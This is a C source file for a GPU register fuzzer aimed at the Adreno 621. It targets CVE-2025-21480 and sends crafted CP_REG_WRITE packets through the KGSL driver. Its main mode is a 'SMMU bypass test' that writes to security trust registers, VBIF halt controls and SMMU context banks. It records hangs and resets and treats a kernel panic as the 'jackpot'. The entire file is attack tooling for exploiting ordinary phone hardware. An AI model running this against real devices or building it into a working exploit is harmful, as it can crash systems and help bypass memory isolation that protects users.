/*
 * gpu_reg_fuzzer.c - Adreno 621 CP_REG_WRITE Fuzzer
 *
 * Purpose: Identify which GPU register writes cause interesting behaviors:
 *   - GPU Hang/Reset (indicates we affected hardware state)
 *   - SMMU Fault (indicates we're touching protected memory regions)
 *   - Kernel Panic (jackpot - indicates exploitable condition)
 *
 * Target: CVE-2025-21480 Micronode validation bypass
 */

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <signal.h>
#include <time.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/wait.h>

/* KGSL IOCTL definitions */
#define KGSL_IOC_TYPE 0x09

struct kgsl_device_getproperty
{
    unsigned int type;
    void *value;
    size_t sizebytes;
};

struct kgsl_gpuobj_alloc
{
    uint64_t size;
    uint64_t flags;
    uint64_t va_len;
    uint64_t mmapaddr;
    uint64_t id;
    uint64_t metadata_len;
    uint64_t metadata;
};

struct kgsl_gpu_command
{
    uint64_t flags;
    uint32_t cmdlist;
    uint32_t cmdsize;
    uint32_t numcmds;
    uint32_t objlist;
    uint32_t objsize;
    uint32_t numobjs;
    uint32_t synclist;
    uint32_t syncsize;
    uint32_t numsyncs;
    uint32_t context_id;
    uint32_t timestamp;
};

struct kgsl_command_object
{
    uint64_t gpuaddr;
    uint64_t size;
    uint32_t flags;
    uint32_t id;
};

struct kgsl_drawctxt_create
{
    uint32_t flags;
    uint32_t drawctxt_id;
};

#define IOCTL_KGSL_DEVICE_GETPROPERTY \
    _IOWR(KGSL_IOC_TYPE, 0x02, struct kgsl_device_getproperty)
#define IOCTL_KGSL_GPUOBJ_ALLOC \
    _IOWR(KGSL_IOC_TYPE, 0x45, struct kgsl_gpuobj_alloc)
#define IOCTL_KGSL_GPU_COMMAND \
    _IOWR(KGSL_IOC_TYPE, 0x3A, struct kgsl_gpu_command)
#define IOCTL_KGSL_DRAWCTXT_CREATE \
    _IOWR(KGSL_IOC_TYPE, 0x13, struct kgsl_drawctxt_create)

/* PM4 Packet Types */
#define CP_TYPE7_PKT(opcode, count) \
    (0x70000000 | (((opcode) & 0x7F) << 16) | ((count) & 0x3FFF))

#define CP_TYPE3_PKT(opcode, count) \
    (0xC0000000 | (((count) - 1) << 16) | (((opcode) & 0xFF) << 8))

/* Key PM4 Opcodes */
#define CP_NOP 0x10
#define CP_WAIT_FOR_IDLE 0x26
#define CP_REG_WRITE 0x60
#define CP_REG_RMW 0x61
#define CP_MEM_WRITE 0x3D
#define CP_REG_TO_MEM 0x3E

/* Adreno 6xx Register Ranges (from public documentation) */
struct reg_range
{
    const char *name;
    uint32_t start;
    uint32_t end;
    int priority; // Higher = more interesting
};

static struct reg_range interesting_ranges[] = {
    // VBIF - Video Bus Interface (SMMU control)
    {"VBIF", 0x3000, 0x3100, 10},

    // RBBM - Ring Buffer Block Manager
    {"RBBM_CLOCK", 0x0000, 0x0100, 5},
    {"RBBM_SECVID", 0x0F00, 0x0F80, 10}, // Security registers!

    // CP - Command Processor
    {"CP_SCRATCH", 0x0800, 0x0880, 3},
    {"CP_MISC", 0x0880, 0x0900, 5},

    // HLSQ - High Level Sequencer
    {"HLSQ", 0xBE00, 0xBF00, 4},

    // GMU - Graphics Management Unit
    {"GMU_CX", 0x1F000, 0x1F800, 8},
    {"GMU_GX", 0x1F800, 0x20000, 8},

    // SMMU Context Banks (if accessible!)
    {"SMMU_CB0", 0x10000, 0x10400, 10},
    {"SMMU_CB1", 0x10400, 0x10800, 10},

    {NULL, 0, 0, 0}};

/* Global state */
static int g_kgsl_fd = -1;
static void *g_cmd_buf = NULL;
static uint64_t g_cmd_gpuaddr = 0;
static uint32_t g_ctx_id = 0;
static volatile int g_timeout = 0;

/* Timeout handler */
void timeout_handler(int sig)
{
    g_timeout = 1;
}

/* Initialize KGSL */
int init_kgsl(void)
{
    g_kgsl_fd = open("/dev/kgsl-3d0", O_RDWR);
    if (g_kgsl_fd < 0)
    {
        perror("[-] Failed to open KGSL");
        return -1;
    }

    /* Allocate command buffer */
    struct kgsl_gpuobj_alloc alloc = {
        .size = 0x10000,
        .flags = 0x00100000, // KGSL_MEMALIGN(12) | KGSL_MEMFLAGS_GPUREADONLY
    };

    if (ioctl(g_kgsl_fd, IOCTL_KGSL_GPUOBJ_ALLOC, &alloc) < 0)
    {
        perror("[-] GPU alloc failed");
        return -1;
    }

    g_cmd_gpuaddr = alloc.mmapaddr;

    /* Map to userspace */
    g_cmd_buf = mmap(NULL, 0x10000, PROT_READ | PROT_WRITE,
                     MAP_SHARED, g_kgsl_fd, alloc.mmapaddr);
    if (g_cmd_buf == MAP_FAILED)
    {
        perror("[-] mmap failed");
        return -1;
    }

    printf("[+] KGSL initialized: fd=%d, gpuaddr=0x%llx\n",
           g_kgsl_fd, (unsigned long long)g_cmd_gpuaddr);

    return 0;
}

/* Build and submit CP_REG_WRITE command */
int fuzz_register(uint32_t reg_offset, uint32_t value, int use_type7)
{
    uint32_t *cmd = (uint32_t *)g_cmd_buf;
    int idx = 0;

    memset(cmd, 0, 0x1000);

    /* Wait for idle first */
    if (use_type7)
    {
        cmd[idx++] = CP_TYPE7_PKT(CP_WAIT_FOR_IDLE, 1);
    }
    else
    {
        cmd[idx++] = CP_TYPE3_PKT(CP_WAIT_FOR_IDLE, 1);
    }
    cmd[idx++] = 0;

    /* CP_REG_WRITE packet */
    if (use_type7)
    {
        cmd[idx++] = CP_TYPE7_PKT(CP_REG_WRITE, 2);
    }
    else
    {
        cmd[idx++] = CP_TYPE3_PKT(CP_REG_WRITE, 3);
    }
    cmd[idx++] = reg_offset; // Register offset (dword aligned)
    cmd[idx++] = value;      // Value to write

    /* Another wait */
    if (use_type7)
    {
        cmd[idx++] = CP_TYPE7_PKT(CP_WAIT_FOR_IDLE, 1);
    }
    else
    {
        cmd[idx++] = CP_TYPE3_PKT(CP_WAIT_FOR_IDLE, 1);
    }
    cmd[idx++] = 0;

    /* NOP padding */
    for (int i = 0; i < 4; i++)
    {
        if (use_type7)
        {
            cmd[idx++] = CP_TYPE7_PKT(CP_NOP, 1);
        }
        else
        {
            cmd[idx++] = CP_TYPE3_PKT(CP_NOP, 1);
        }
        cmd[idx++] = 0;
    }

    __sync_synchronize();

    /* Submit command */
    struct kgsl_command_object cmdobj = {
        .gpuaddr = g_cmd_gpuaddr,
        .size = idx * sizeof(uint32_t),
        .flags = 0x1, // IB type
        .id = 1,
    };

    struct kgsl_gpu_command gpucmd = {
        .flags = 0,
        .cmdlist = (uint32_t)(uintptr_t)&cmdobj,
        .cmdsize = sizeof(cmdobj),
        .numcmds = 1,
        .context_id = g_ctx_id,
    };

    /* Set timeout */
    g_timeout = 0;
    signal(SIGALRM, timeout_handler);
    alarm(2); // 2 second timeout

    int ret = ioctl(g_kgsl_fd, IOCTL_KGSL_GPU_COMMAND, &gpucmd);

    alarm(0);

    if (g_timeout)
    {
        return -2; // Timeout (GPU hang)
    }

    return ret;
}

/* Check GPU health */
int check_gpu_health(void)
{
    struct kgsl_device_getproperty prop;
    uint32_t gpu_busy = 0;

    prop.type = 5; // KGSL_PROP_GPU_BUSY_PERCENTAGE
    prop.value = &gpu_busy;
    prop.sizebytes = sizeof(gpu_busy);

    int ret = ioctl(g_kgsl_fd, IOCTL_KGSL_DEVICE_GETPROPERTY, &prop);
    if (ret < 0)
    {
        return -1; // GPU possibly dead
    }

    return 0;
}

/* Main fuzzing loop */
void fuzz_range(struct reg_range *range, FILE *log)
{
    printf("\n[*] Fuzzing range: %s (0x%04x - 0x%04x)\n",
           range->name, range->start, range->end);

    int interesting_count = 0;

    for (uint32_t reg = range->start; reg < range->end; reg += 4)
    {
        /* Test values */
        uint32_t test_values[] = {
            0x00000000, // Zero
            0x00000001, // Enable bit
            0xFFFFFFFF, // All ones
            0xDEADBEEF, // Magic (detect in dumps)
        };

        for (int v = 0; v < 4; v++)
        {
            /* Fork to isolate crashes */
            pid_t pid = fork();
            if (pid == 0)
            {
                /* Child - do the fuzzing */
                int ret = fuzz_register(reg >> 2, test_values[v], 1); // Type 7

                if (ret == -2)
                {
                    printf("[!] HANG: reg=0x%04x val=0x%08x\n", reg, test_values[v]);
                    exit(2);
                }
                else if (ret < 0 && errno != EINVAL)
                {
                    printf("[!] ERROR: reg=0x%04x val=0x%08x errno=%d\n",
                           reg, test_values[v], errno);
                    exit(1);
                }
                exit(0);
            }
            else
            {
                /* Parent - wait and check */
                int status;
                int wpid = waitpid(pid, &status, 0);

                if (WIFEXITED(status))
                {
                    int code = WEXITSTATUS(status);
                    if (code == 2)
                    {
                        fprintf(log, "HANG,0x%04x,0x%08x,%s\n",
                                reg, test_values[v], range->name);
                        interesting_count++;
                    }
                    else if (code == 1)
                    {
                        fprintf(log, "ERROR,0x%04x,0x%08x,%s\n",
                                reg, test_values[v], range->name);
                    }
                }
                else if (WIFSIGNALED(status))
                {
                    fprintf(log, "CRASH,0x%04x,0x%08x,%s,signal=%d\n",
                            reg, test_values[v], range->name, WTERMSIG(status));
                    interesting_count++;
                }

                /* Check if GPU is still alive */
                usleep(10000); // 10ms delay
                if (check_gpu_health() < 0)
                {
                    printf("[!] GPU RESET detected after reg=0x%04x\n", reg);
                    fprintf(log, "RESET,0x%04x,0x%08x,%s\n",
                            reg, test_values[v], range->name);
                    interesting_count++;

                    /* Reinitialize KGSL */
                    close(g_kgsl_fd);
                    usleep(500000); // Wait 500ms for GPU recovery
                    if (init_kgsl() < 0)
                    {
                        printf("[-] Failed to reinit KGSL, aborting\n");
                        return;
                    }
                }
            }
        }

        /* Progress indicator */
        if ((reg - range->start) % 0x100 == 0)
        {
            printf("  Progress: 0x%04x (found %d interesting)\n",
                   reg, interesting_count);
        }
    }

    printf("[+] Range %s complete: %d interesting findings\n",
           range->name, interesting_count);
}

/* Quick test specific registers */
void quick_test_smmu_bypass(void)
{
    printf("\n=== Quick SMMU Bypass Test ===\n");

    /* High-priority targets for SMMU bypass */
    struct
    {
        const char *name;
        uint32_t reg;
        uint32_t value;
    } targets[] = {
        {"VBIF_XIN_HALT_CTRL0", 0x3000, 0x00000001},
        {"VBIF_XIN_HALT_CTRL1", 0x3004, 0x00000001},
        {"VBIF_GATE_OFF_WRREQ", 0x302C, 0x00000001},
        {"RBBM_SECVID_TRUST_CNTL", 0x0F00, 0x00000000},
        {"RBBM_SECVID_TSB_TRUSTED_BASE", 0x0F10, 0x80000000},
        {"GMU_CM3_CFG", 0x1F800, 0x00000000},
        {NULL, 0, 0}};

    for (int i = 0; targets[i].name != NULL; i++)
    {
        printf("[*] Testing %s (0x%04x = 0x%08x)...\n",
               targets[i].name, targets[i].reg, targets[i].value);

        int ret = fuzz_register(targets[i].reg >> 2, targets[i].value, 1);

        if (ret == 0)
        {
            printf("    [+] ACCEPTED (no error)\n");
        }
        else if (ret == -2)
        {
            printf("    [!] HANG - GPU stopped responding!\n");
        }
        else
        {
            printf("    [-] Rejected: errno=%d (%s)\n", errno, strerror(errno));
        }

        usleep(100000); // 100ms between tests
    }
}

int main(int argc, char **argv)
{
    printf("=== Adreno 621 CP_REG_WRITE Fuzzer ===\n");
    printf("Target: CVE-2025-21480 Micronode Bypass\n\n");

    /* Initialize */
    if (init_kgsl() < 0)
    {
        return 1;
    }

    /* Open log file */
    char logname[256];
    snprintf(logname, sizeof(logname), "/data/local/tmp/gpu_fuzz_%ld.csv", time(NULL));
    FILE *log = fopen(logname, "w");
    if (!log)
    {
        log = stdout;
        printf("[!] Cannot create log file, using stdout\n");
    }
    else
    {
        printf("[+] Logging to: %s\n", logname);
        fprintf(log, "Type,Register,Value,Range,Extra\n");
    }

    /* Mode selection */
    int mode = 0;
    if (argc > 1)
    {
        mode = atoi(argv[1]);
    }

    switch (mode)
    {
    case 0:
        printf("\n[*] Mode 0: Quick SMMU bypass test\n");
        quick_test_smmu_bypass();
        break;

    case 1:
        printf("\n[*] Mode 1: Full range fuzzing (SLOW!)\n");
        for (int i = 0; interesting_ranges[i].name != NULL; i++)
        {
            if (interesting_ranges[i].priority >= 8)
            {
                fuzz_range(&interesting_ranges[i], log);
            }
        }
        break;

    case 2:
        printf("\n[*] Mode 2: VBIF only (SMMU focus)\n");
        fuzz_range(&interesting_ranges[0], log);
        break;

    default:
        printf("Usage: %s [mode]\n", argv[0]);
        printf("  0: Quick SMMU bypass test\n");
        printf("  1: Full range fuzzing\n");
        printf("  2: VBIF only\n");
    }

    if (log != stdout)
    {
        fclose(log);
    }

    printf("\n[*] Fuzzing complete\n");
    return 0;
}
